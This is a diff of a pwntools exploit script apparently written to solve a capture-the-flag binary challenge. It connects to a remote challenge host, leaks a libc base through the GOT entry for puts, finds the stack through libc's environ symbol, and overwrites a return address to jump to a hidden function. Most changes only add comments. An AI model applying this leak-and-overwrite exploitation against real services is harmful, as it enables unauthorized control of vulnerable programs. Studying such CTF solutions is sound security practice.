@@ -8,7 +8,6 @@ filename = "./chall"
 #io = process(filename)
 io = remote("139.59.176.252", 31342)
 elf = ELF(filename)
-#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 libc = ELF("./libc.so.6")
 
 context.clear(arch="amd64")
@@ -46,14 +45,14 @@ def plant(store, value):
 	io.sendlineafter("> ", str(value))
 
 def main():
-	base_address = leak_libc_base_address(elf.got.puts)
+	base_address = leak_libc_base_address(elf.got.puts) # Leak the address at got 
 	environ = base_address + libc.sym.environ
 	log.info("Environ: %s "  % hex(environ))
 
-	leaked_address = stack_address(environ)
+	leaked_address = stack_address(environ) # The the address @ environ to get the stack address.
 
-	ret_address = leaked_address - 0xf0 - 48
-	plant(ret_address, elf.sym.hidden_resources)
+	plant_ret_address = leaked_address - 0xf0 - 48 
+	plant(plant_ret_address, elf.sym.hidden_resources) # final overwrite
 	io.interactive()
 
 if __name__ == "__main__":
